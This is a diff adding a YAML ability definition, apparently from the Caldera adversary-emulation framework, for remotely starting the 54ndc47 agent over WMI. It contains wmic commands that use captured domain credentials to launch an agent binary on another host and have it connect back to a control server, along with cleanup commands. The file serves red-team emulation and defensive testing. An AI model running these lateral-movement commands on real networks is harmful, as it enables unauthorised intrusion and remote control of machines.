@@ -1,0 +1,51 @@
+---
+
+- id: ece5dde3-d370-4c20-b213-a1f424aa8d03
+  name: Start 54ndc47 (WMI)
+  description: Remotely executes 54ndc47 over WMI
+  tactic: execution
+  technique:
+    attack_id: T1047
+    name: Windows Management Instrumentation
+  platforms:
+    windows:
+      psh:
+        command: |
+          $node = '''#{remote.host.fqdn}''';
+          $user = '''#{domain.user.name}''';
+          $password = '''#{domain.user.password}''';
+          wmic /node:$node /user:$user /password:$password process call create "powershell.exe C:\Users\Public\s4ndc4t.exe -server #{server} -group #{group}";
+        cleanup: |
+          $node = '''#{remote.host.fqdn}''';
+          $user = '''#{domain.user.name}''';
+          $password = '''#{domain.user.password}''';
+          wmic /node:$node /user:$user /password:$password process call create "taskkill /f /im s4ndc4t.exe"
+      cmd:
+        command: |
+          $node = '''#{remote.host.fqdn}''';
+          $user = '''#{domain.user.name}''';
+          $password = '''#{domain.user.password}''';
+          wmic /node:$node /user:$user /password:$password process call create "cmd.exe C:\Users\Public\s4ndc4t.exe -server #{server} -group #{group}";
+        cleanup: |
+          $node = '''#{remote.host.fqdn}''';
+          $user = '''#{domain.user.name}''';
+          $password = '''#{domain.user.password}''';
+          wmic /node:$node /user:$user /password:$password process call create "taskkill /f /im s4ndc4t.exe"
+  singleton: True
+  requirements:
+    - plugins.stockpile.app.requirements.basic:
+      - source: domain.user.name
+        edge: has_password
+        target: domain.user.password
+    - plugins.stockpile.app.requirements.basic:
+      - source: remote.host.fqdn
+        edge: has_54ndc47_copy
+    - plugins.stockpile.app.requirements.req_like:
+      - source: remote.host.fqdn
+        edge: has_admin
+        target: domain.user.name
+    - plugins.stockpile.app.requirements.no_backwards_movement:
+       - source: remote.host.fqdn
+    - plugins.stockpile.app.requirements.reachable:
+        - source: remote.host.fqdn
+          edge: isAccessibleFrom
